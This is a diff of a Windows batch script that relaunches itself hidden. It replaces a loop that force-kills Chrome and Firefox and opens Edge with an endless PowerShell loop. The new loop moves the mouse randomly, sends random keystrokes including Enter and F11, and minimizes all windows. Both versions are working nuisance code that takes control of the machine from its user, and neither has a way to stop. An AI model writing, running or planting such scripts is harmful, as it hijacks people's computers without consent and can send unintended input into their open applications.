@@ -3,50 +3,27 @@ if "%1" neq "hidden" (
     powershell -windowstyle hidden -command "Start-Process '%~f0' -ArgumentList 'hidden' -WindowStyle Hidden"
     exit
 )
-
-setlocal
-
-rem Paths to Edge
-set "EDGE_PATH1=C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe"
-set "EDGE_PATH2=C:\Program Files\Microsoft\Edge\Application\msedge.exe"
-
-:loop
-rem Check if Chrome is running
-tasklist /FI "IMAGENAME eq chrome.exe" | find /I "chrome.exe" >nul
-set "CHROME_ACTIVE=%ERRORLEVEL%"
-
-rem Check if Firefox is running
-tasklist /FI "IMAGENAME eq firefox.exe" | find /I "firefox.exe" >nul
-set "FIREFOX_ACTIVE=%ERRORLEVEL%"
-
-rem Check if Edge window is visible
-powershell -command "$edgeWindow = Get-Process msedge -ErrorAction SilentlyContinue | Where-Object { $_.MainWindowHandle -ne 0 }; if ($edgeWindow) { exit 0 } else { exit 1 }"
-set "EDGE_VISIBLE=%ERRORLEVEL%"
-
-rem If Chrome is running, close it
-if %CHROME_ACTIVE%==0 (
-    echo Chrome detected. Closing...
-    taskkill /F /IM chrome.exe >nul 2>&1
-)
-
-rem If Firefox is running, close it
-if %FIREFOX_ACTIVE%==0 (
-    echo Firefox detected. Closing...
-    taskkill /F /IM firefox.exe >nul 2>&1
-)
-
-rem If BOTH Chrome and Firefox are NOT running AND Edge is NOT visible, launch Edge
-if %CHROME_ACTIVE%==1 if %FIREFOX_ACTIVE%==1 if %EDGE_VISIBLE%==1 (
-    echo Launching Edge...
-    if exist "%EDGE_PATH1%" (
-        start "" "%EDGE_PATH1%" --new-window
-    ) else if exist "%EDGE_PATH2%" (
-        start "" "%EDGE_PATH2%" --new-window
-    ) else (
-        echo ERROR: Edge not found.
-    )
-)
-
-rem Wait 5 seconds before checking again
-timeout /t 2 >nul
-goto loop
+:: -----------------------------
+:: Batch launcher for persistent PowerShell auto-move
+:: -----------------------------
+powershell -NoExit -Command ^
+"$wshell = New-Object -ComObject WScript.Shell; ^
+Add-Type -AssemblyName System.Windows.Forms; ^
+while ($true) { ^
+    $scr = [System.Windows.Forms.Screen]::PrimaryScreen.Bounds; ^
+    $x = Get-Random -Minimum 0 -Maximum $scr.Width; ^
+    $y = Get-Random -Minimum 0 -Maximum $scr.Height; ^
+    [System.Windows.Forms.Cursor]::Position = New-Object System.Drawing.Point($x,$y); ^
+    $rKey = Get-Random -Minimum 0 -Maximum 5; ^
+    switch ($rKey) { ^
+        0 { $wshell.SendKeys('w') } ^
+        1 { $wshell.SendKeys('a') } ^
+        2 { $wshell.SendKeys('s') } ^
+        3 { $wshell.SendKeys('d') } ^
+        4 { $wshell.SendKeys('{F11}') } ^
+        5 { (New-Object -ComObject Shell.Application).MinimizeAll() } ^
+    }; ^
+    $rEnter = Get-Random -Minimum 0 -Maximum 3; ^
+    if ($rEnter -eq 0) { $wshell.SendKeys('~') }; ^
+    Start-Sleep -Milliseconds (Get-Random -Minimum 50 -Maximum 120); ^
+}"
